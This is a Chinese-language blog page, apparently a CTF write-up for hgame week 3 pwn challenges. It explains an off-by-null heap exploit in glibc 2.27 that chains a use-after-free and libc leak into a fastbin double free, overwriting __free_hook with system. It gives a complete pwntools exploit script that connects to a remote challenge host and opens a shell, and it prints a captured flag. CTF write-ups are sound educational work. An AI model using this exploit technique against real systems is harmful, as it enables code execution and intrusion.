@@ -1,0 +1,161 @@
+<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>hgame_week3_pwn题解 | k0rian's blog</title><meta name="author" content="k0rian"><meta name="copyright" content="k0rian"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="溢出来了offset_by_null利用的是堆合并时的漏洞，glibc 2.27的unsorted bin chunk在合并时，会根据当前chunk的prev in use位来判断是否向前&#x2F;向后合并，然后通过prev size取到unsortedbin chunk的地址，这个时候会做一次检查，但中间合并的chunk他是不会做检查的，也就是说，即便中间的chunk是 in use的状态，也">
+<meta property="og:type" content="article">
+<meta property="og:title" content="hgame_week3_pwn题解">
+<meta property="og:url" content="http://example.com/posts/hgame_week3.html">
+<meta property="og:site_name" content="k0rian&#39;s blog">
+<meta property="og:description" content="溢出来了offset_by_null利用的是堆合并时的漏洞，glibc 2.27的unsorted bin chunk在合并时，会根据当前chunk的prev in use位来判断是否向前&#x2F;向后合并，然后通过prev size取到unsortedbin chunk的地址，这个时候会做一次检查，但中间合并的chunk他是不会做检查的，也就是说，即便中间的chunk是 in use的状态，也">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://example.com/img/favicon.jpg">
+<meta property="article:published_time" content="2024-02-22T11:53:48.000Z">
+<meta property="article:modified_time" content="2024-02-22T14:10:43.615Z">
+<meta property="article:author" content="k0rian">
+<meta property="article:tag" content="二进制">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://example.com/img/favicon.jpg"><link rel="shortcut icon" href="/img/favicon.jpg"><link rel="canonical" href="http://example.com/posts/hgame_week3.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css?v=4.12.0"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@6.5.1/css/all.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui@5.0.32/dist/fancybox/fancybox.min.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = {
+  root: '/',
+  algolia: undefined,
+  localSearch: {"path":"/search.xml","preload":false,"top_n_per_article":1,"unescape":false,"languages":{"hits_empty":"找不到您查询的内容：${query}","hits_stats":"共找到 ${hits} 篇文章"}},
+  translate: undefined,
+  noticeOutdate: undefined,
+  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false},
+  copy: {
+    success: '复制成功',
+    error: '复制错误',
+    noSupport: '浏览器不支持'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '',
+  dateSuffix: {
+    just: '刚刚',
+    min: '分钟前',
+    hour: '小时前',
+    day: '天前',
+    month: '个月前'
+  },
+  copyright: undefined,
+  lightbox: 'fancybox',
+  Snackbar: undefined,
+  infinitegrid: {
+    js: 'https://cdn.jsdelivr.net/npm/@egjs/infinitegrid@4.11.0/dist/infinitegrid.min.js',
+    buttonText: '加载更多'
+  },
+  isPhotoFigcaption: false,
+  islazyload: false,
+  isAnchor: false,
+  percent: {
+    toc: true,
+    rightside: false,
+  },
+  autoDarkmode: false
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: 'hgame_week3_pwn题解',
+  isPost: true,
+  isHome: false,
+  isHighlightShrink: false,
+  isToc: true,
+  postUpdate: '2024-02-22 22:10:43'
+}</script><script>(win=>{
+      win.saveToLocal = {
+        set: (key, value, ttl) => {
+          if (ttl === 0) return
+          const now = Date.now()
+          const expiry = now + ttl * 86400000
+          const item = {
+            value,
+            expiry
+          }
+          localStorage.setItem(key, JSON.stringify(item))
+        },
+      
+        get: key => {
+          const itemStr = localStorage.getItem(key)
+      
+          if (!itemStr) {
+            return undefined
+          }
+          const item = JSON.parse(itemStr)
+          const now = Date.now()
+      
+          if (now > item.expiry) {
+            localStorage.removeItem(key)
+            return undefined
+          }
+          return item.value
+        }
+      }
+    
+      win.getScript = (url, attr = {}) => new Promise((resolve, reject) => {
+        const script = document.createElement('script')
+        script.src = url
+        script.async = true
+        script.onerror = reject
+        script.onload = script.onreadystatechange = function() {
+          const loadState = this.readyState
+          if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+          script.onload = script.onreadystatechange = null
+          resolve()
+        }
+
+        Object.keys(attr).forEach(key => {
+          script.setAttribute(key, attr[key])
+        })
+
+        document.head.appendChild(script)
+      })
+    
+      win.getCSS = (url, id = false) => new Promise((resolve, reject) => {
+        const link = document.createElement('link')
+        link.rel = 'stylesheet'
+        link.href = url
+        if (id) link.id = id
+        link.onerror = reject
+        link.onload = link.onreadystatechange = function() {
+          const loadState = this.readyState
+          if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+          link.onload = link.onreadystatechange = null
+          resolve()
+        }
+        document.head.appendChild(link)
+      })
+    
+      win.activateDarkMode = () => {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      win.activateLightMode = () => {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+        }
+      }
+      const t = saveToLocal.get('theme')
+    
+        if (t === 'dark') activateDarkMode()
+        else if (t === 'light') activateLightMode()
+      
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        if (asideStatus === 'hide') {
+          document.documentElement.classList.add('hide-aside')
+        } else {
+          document.documentElement.classList.remove('hide-aside')
+        }
+      }
+    
+      const detectApple = () => {
+        if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
+          document.documentElement.classList.add('apple')
+        }
+      }
+      detectApple()
+    })(window)</script><meta name="generator" content="Hexo 7.0.0"></head><body><div id="web_bg"></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="/img/favicon.jpg" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="sidebar-site-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">5</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">1</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">0</div></a></div><hr class="custom-hr"/></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url('/img/background.jpg')"><nav id="nav"><span id="blog-info"><a href="/" title="k0rian's blog"><span class="site-name">k0rian's blog</span></a></span><div id="menus"><div id="search-button"><a class="site-page social-icon search" href="javascript:void(0);"><i class="fas fa-search fa-fw"></i><span> 搜索</span></a></div><div id="toggle-menu"><a class="site-page" href="javascript:void(0);"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">hgame_week3_pwn题解</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2024-02-22T11:53:48.000Z" title="发表于 2024-02-22 19:53:48">2024-02-22</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2024-02-22T14:10:43.615Z" title="更新于 2024-02-22 22:10:43">2024-02-22</time></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title="hgame_week3_pwn题解"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">阅读量:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><h2 id="溢出来了"><a href="#溢出来了" class="headerlink" title="溢出来了"></a>溢出来了</h2><h3 id="offset-by-null"><a href="#offset-by-null" class="headerlink" title="offset_by_null"></a>offset_by_null</h3><p>利用的是堆合并时的漏洞，glibc 2.27的unsorted bin chunk在合并时，会根据当前chunk的prev in use位来判断是否向前&#x2F;向后合并，然后通过prev size取到unsortedbin chunk的地址，这个时候会做一次检查，但中间合并的chunk他是不会做检查的，也就是说，即便中间的chunk是 in use的状态，也会被合并进去。也就是说我们可以构造一个这样的结构，假设有三个地址连续的chunk，我们把第一个chunk放进unsorted bin中，chunk2和chunk3 malloc出来，通过chunk2的offset by null改到chunk3的prev in use位，然后再把chunk3放入unsorted bin，触发合并，那么，正在in use状态的chunk2就会被合并进去,此时我们仍能访问到chunk2，uaf就达成了。这里可以泄露一次libc.</p>
+<h3 id="fastbins-double-free任意地址写"><a href="#fastbins-double-free任意地址写" class="headerlink" title="fastbins_double_free任意地址写"></a>fastbins_double_free任意地址写</h3><p>可是这里充其量只能泄露，chunk中的内容已经不能修改了，我们得换种思路实现任意地址写，这里应该能用heap overlapping, 但本人用的是fastbin double free,通过切割unsorted bin来实现的。我们合并完后，会得到一个0x300大小的unsorted bin,此时我们的note指针还残留了一个，还可以free一次，也就是说，只要合理地切分这个0x300的chunk，我们是有办法将残留指针指向的chunk放进fastbins的，此时再free这个指针，double free就实现了,计算得到切割块的大小必须得是0x40(由于需要填充tcache)</p>
+<h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#p=process(&quot;./vuln&quot;)</span></span><br><span class="line">p=remote(<span class="string">&quot;139.196.183.57&quot;</span>,<span class="number">30703</span>)</span><br><span class="line">elf=ELF(<span class="string">&quot;./vuln&quot;</span>)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add_note</span>(<span class="params">index,size,payload</span>):</span><br><span class="line">	p.sendlineafter(<span class="string">&quot;Your choice:&quot;</span>,<span class="built_in">str</span>(<span class="number">1</span>))</span><br><span class="line">	p.sendlineafter(<span class="string">&quot;Index: &quot;</span>,<span class="built_in">str</span>(index))</span><br><span class="line">	p.sendlineafter(<span class="string">&quot;Size: &quot;</span>,<span class="built_in">str</span>(size))</span><br><span class="line">	p.sendafter(<span class="string">&quot;Content: &quot;</span>,payload)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">index</span>):</span><br><span class="line">	p.sendlineafter(<span class="string">&quot;Your choice:&quot;</span>,<span class="built_in">str</span>(<span class="number">3</span>))</span><br><span class="line">	p.sendlineafter(<span class="string">&quot;Index: &quot;</span>,<span class="built_in">str</span>(index))</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">index</span>):</span><br><span class="line">	p.sendlineafter(<span class="string">&quot;Your choice:&quot;</span>,<span class="built_in">str</span>(<span class="number">2</span>))</span><br><span class="line">	p.sendlineafter(<span class="string">&quot;Index: &quot;</span>,<span class="built_in">str</span>(index))</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">exit</span>():</span><br><span class="line">	p.sendlineafter(<span class="string">&quot;Your choice:&quot;</span>,<span class="built_in">str</span>(<span class="number">4</span>))</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">	add_note(i,<span class="number">0xf8</span>,<span class="string">b&quot;a&quot;</span>*<span class="number">0xf8</span>)</span><br><span class="line">add_note(<span class="number">7</span>,<span class="number">0xf8</span>,<span class="string">b&quot;a&quot;</span>*<span class="number">0xf8</span>)</span><br><span class="line">add_note(<span class="number">8</span>,<span class="number">0xf8</span>,<span class="string">b&quot;a&quot;</span>*<span class="number">0xf8</span>)</span><br><span class="line">add_note(<span class="number">9</span>,<span class="number">0xf8</span>,<span class="string">b&quot;a&quot;</span>*<span class="number">0xf8</span>)</span><br><span class="line">add_note(<span class="number">10</span>,<span class="number">0xf0</span>,<span class="string">b&quot;a&quot;</span>*<span class="number">0xf0</span>)</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">add_note(<span class="number">11</span>,<span class="number">0x10</span>,<span class="string">b&quot;a&quot;</span>*<span class="number">0x10</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">	delete(i)</span><br><span class="line">delete(<span class="number">8</span>)</span><br><span class="line">add_note(<span class="number">6</span>,<span class="number">0xf0</span>,<span class="string">b&quot;a&quot;</span>*<span class="number">0xf0</span>)</span><br><span class="line">delete(<span class="number">9</span>)</span><br><span class="line">add_note(<span class="number">9</span>,<span class="number">0xf8</span>,<span class="number">0xf0</span>*<span class="string">b&quot;a&quot;</span>+p64(<span class="number">0x200</span>))</span><br><span class="line">delete(<span class="number">6</span>)</span><br><span class="line">delete(<span class="number">10</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">	add_note(i,<span class="number">0xf0</span>,<span class="string">b&quot;a&quot;</span>*<span class="number">0xf0</span>)</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">add_note(<span class="number">8</span>,<span class="number">0xf8</span>,<span class="string">b&quot;a&quot;</span>*<span class="number">0xf0</span>+p64(<span class="number">0x100</span>))</span><br><span class="line">show(<span class="number">9</span>)</span><br><span class="line">offset=<span class="number">4111520</span></span><br><span class="line">main_arena=u64(p.recv(<span class="number">8</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&quot;\x00&quot;</span>))</span><br><span class="line">libc_base=main_arena-offset</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(libc_base))</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">libc=ELF(<span class="string">&quot;./libc-2.27.so&quot;</span>)</span><br><span class="line">free_hook=libc_base+libc.sym[<span class="string">&quot;__free_hook&quot;</span>]</span><br><span class="line"><span class="comment">#add_note(12,0xa0)</span></span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line"><span class="comment">#add_note(9,0xf9,p64(main_arena)+p64(free_hook)+b&quot;a&quot;*0xe9)</span></span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">add_note(<span class="number">12</span>,<span class="number">0xf0</span>,<span class="string">b&quot;a&quot;</span>*<span class="number">0xf0</span>)</span><br><span class="line">add_note(<span class="number">10</span>,<span class="number">0xf0</span>,<span class="string">b&quot;a&quot;</span>*<span class="number">0xf0</span>)</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">6</span>):</span><br><span class="line">	delete(i)</span><br><span class="line">delete(<span class="number">12</span>)</span><br><span class="line">delete(<span class="number">8</span>)</span><br><span class="line">add_note(<span class="number">12</span>,<span class="number">0xf8</span>,<span class="number">0xf0</span>*<span class="string">b&quot;a&quot;</span>+p64(<span class="number">0x200</span>))</span><br><span class="line">delete(<span class="number">6</span>)</span><br><span class="line">delete(<span class="number">10</span>)</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>):</span><br><span class="line">	add_note(i,<span class="number">0x30</span>,<span class="string">b&quot;a&quot;</span>*<span class="number">0x30</span>)</span><br><span class="line">delete(<span class="number">7</span>)</span><br><span class="line">add_note(<span class="number">4</span>,<span class="number">0x30</span>,<span class="string">b&quot;a&quot;</span>*<span class="number">0x30</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">3</span>):</span><br><span class="line">	add_note(i+<span class="number">5</span>,<span class="number">0x30</span>,<span class="string">b&quot;a&quot;</span>*<span class="number">0x30</span>)</span><br><span class="line">add_note(<span class="number">13</span>,<span class="number">0x30</span>,<span class="string">b&quot;a&quot;</span>*<span class="number">0x30</span>)</span><br><span class="line">add_note(<span class="number">8</span>,<span class="number">0x30</span>,<span class="string">b&quot;a&quot;</span>*<span class="number">0x30</span>)</span><br><span class="line">delete(<span class="number">8</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>):</span><br><span class="line">	delete(i)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">5</span>,<span class="number">7</span>):</span><br><span class="line">	delete(i)</span><br><span class="line">delete(<span class="number">9</span>)</span><br><span class="line">delete(<span class="number">7</span>)</span><br><span class="line">delete(<span class="number">13</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>):</span><br><span class="line">	add_note(i,<span class="number">0x30</span>,<span class="string">b&quot;a&quot;</span>*<span class="number">0x30</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">5</span>,<span class="number">7</span>):</span><br><span class="line">	add_note(i,<span class="number">0x30</span>,<span class="string">b&quot;a&quot;</span>*<span class="number">0x30</span>)</span><br><span class="line">payload=p64(free_hook)</span><br><span class="line">add_note(<span class="number">7</span>,<span class="number">0x30</span>,p64(free_hook))</span><br><span class="line">sleep(<span class="number">0.25</span>)</span><br><span class="line">add_note(<span class="number">8</span>,<span class="number">0x30</span>,p64(free_hook))</span><br><span class="line">sleep(<span class="number">0.25</span>)</span><br><span class="line">add_note(<span class="number">9</span>,<span class="number">0x30</span>,<span class="string">b&quot;a&quot;</span>*<span class="number">0x30</span>)</span><br><span class="line">add_note(<span class="number">10</span>,<span class="number">0x30</span>,<span class="string">b&quot;/bin/sh\x00&quot;</span>)</span><br><span class="line">sleep(<span class="number">0.25</span>)</span><br><span class="line">system=libc_base+libc.sym[<span class="string">&quot;system&quot;</span>]</span><br><span class="line">add_note(<span class="number">13</span>,<span class="number">0x30</span>,p64(system))</span><br><span class="line">delete(<span class="number">10</span>)</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line"><span class="comment">#exit()</span></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+<h2 id="eldenring3"><a href="#eldenring3" class="headerlink" title="eldenring3"></a>eldenring3</h2><p>不会 ，现在看到io_file就想死<br>flag: hgame{9db0b9cb3ec594a7f698cec1fb05857a7b992701}</p>
+</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta"><i class="fas fa-circle-user fa-fw"></i>文章作者: </span><span class="post-copyright-info"><a href="http://example.com">k0rian</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta"><i class="fas fa-square-arrow-up-right fa-fw"></i>文章链接: </span><span class="post-copyright-info"><a href="http://example.com/posts/hgame_week3.html">http://example.com/posts/hgame_week3.html</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta"><i class="fas fa-circle-exclamation fa-fw"></i>版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="http://example.com" target="_blank">k0rian's blog</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"></div><div class="post_share"><div class="social-share" data-image="/img/favicon.jpg" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.3/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.3/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="next-post pull-full"><a href="/posts/hgame_week2.html" title="hgame_week2_pwn题解"><div class="cover" style="background: var(--default-bg-color)"></div><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">hgame_week2_pwn题解</div></div></a></div></nav></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="is-center"><div class="avatar-img"><img src="/img/favicon.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info__name">k0rian</div><div class="author-info__description">没人？打个胶先</div></div><div class="card-info-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">5</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">1</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">0</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/xxxxxx"><i class="fab fa-github"></i><span>Follow Me</span></a></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>公告</span></div><div class="announcement_content">This is my Blog</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%BA%A2%E5%87%BA%E6%9D%A5%E4%BA%86"><span class="toc-number">1.</span> <span class="toc-text">溢出来了</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#offset-by-null"><span class="toc-number">1.1.</span> <span class="toc-text">offset_by_null</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#fastbins-double-free%E4%BB%BB%E6%84%8F%E5%9C%B0%E5%9D%80%E5%86%99"><span class="toc-number">1.2.</span> <span class="toc-text">fastbins_double_free任意地址写</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#exp"><span class="toc-number">1.3.</span> <span class="toc-text">exp</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#eldenring3"><span class="toc-number">2.</span> <span class="toc-text">eldenring3</span></a></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/posts/hgame_week3.html" title="hgame_week3_pwn题解">hgame_week3_pwn题解</a><time datetime="2024-02-22T11:53:48.000Z" title="发表于 2024-02-22 19:53:48">2024-02-22</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/posts/hgame_week2.html" title="hgame_week2_pwn题解">hgame_week2_pwn题解</a><time datetime="2024-02-13T11:53:48.000Z" title="发表于 2024-02-13 19:53:48">2024-02-13</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/posts/hgame_week1.html" title="hgame_week1_pwn题解">hgame_week1_pwn题解</a><time datetime="2024-02-11T11:53:48.000Z" title="发表于 2024-02-11 19:53:48">2024-02-11</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/posts/ez_fmt.html" title="强网杯ez_fmt复现">强网杯ez_fmt复现</a><time datetime="2024-01-25T16:00:00.000Z" title="发表于 2024-01-26 00:00:00">2024-01-26</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/posts/HackNote.html" title="HackNote">HackNote</a><time datetime="2024-01-17T11:53:48.000Z" title="发表于 2024-01-17 19:53:48">2024-01-17</time></div></div></div></div></div></div></main><footer id="footer" style="background-image: url('/img/background.jpg')"><div id="footer-wrap"><div class="copyright">&copy;2020 - 2024 By k0rian</div><div class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="回到顶部"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js?v=4.12.0"></script><script src="/js/main.js?v=4.12.0"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/ui@5.0.32/dist/fancybox/fancybox.umd.min.js"></script><div class="js-pjax"></div><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><div id="local-search"><div class="search-dialog"><nav class="search-nav"><span class="search-dialog-title">搜索</span><span id="loading-status"></span><button class="search-close-button"><i class="fas fa-times"></i></button></nav><div class="is-center" id="loading-database"><i class="fas fa-spinner fa-pulse"></i><span>  数据库加载中</span></div><div class="search-wrap"><div id="local-search-input"><div class="local-search-box"><input class="local-search-box--input" placeholder="搜索文章" type="text"/></div></div><hr/><div id="local-search-results"></div><div id="local-search-stats-wrap"></div></div></div><div id="search-mask"></div><script src="/js/search/local-search.js?v=4.12.0"></script></div></div></body></html>
